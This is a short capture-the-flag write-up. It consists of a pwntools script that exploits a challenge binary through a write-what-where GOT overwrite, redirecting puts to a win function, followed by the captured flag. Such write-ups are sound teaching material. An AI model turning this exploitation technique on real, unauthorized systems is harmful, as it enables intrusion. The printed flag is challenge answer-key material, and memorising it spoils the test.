# pwn - What you have

```python
from pwn import *

# Configuration
host = 'chall.0xfun.org'
port = 43966

# Addresses from your GDB session
puts_got = 0x403430
win_func = 0x401236

io = remote(host, port)

# The binary asks "Show me what you GOT!"
# We provide the address of the GOT entry for puts
log.info(f"Sending GOT address (Where): {hex(puts_got)}")
io.sendline(str(puts_got).encode())

# The binary asks for the second value
# We provide the address of the win function
log.info(f"Sending win address (What): {hex(win_func)}")
io.sendline(str(win_func).encode())

# The program then executes: mov QWORD PTR [puts_got], win_func
# Then it calls puts(), which now jumps to win()

# Switch to interactive to see the flag
io.interactive()
```
FLAG:`0xfun{g3tt1ng_schw1fty_w1th_g0t_0v3rwr1t3s_1384311_m4x1m4l}`

Solved by: ha1qal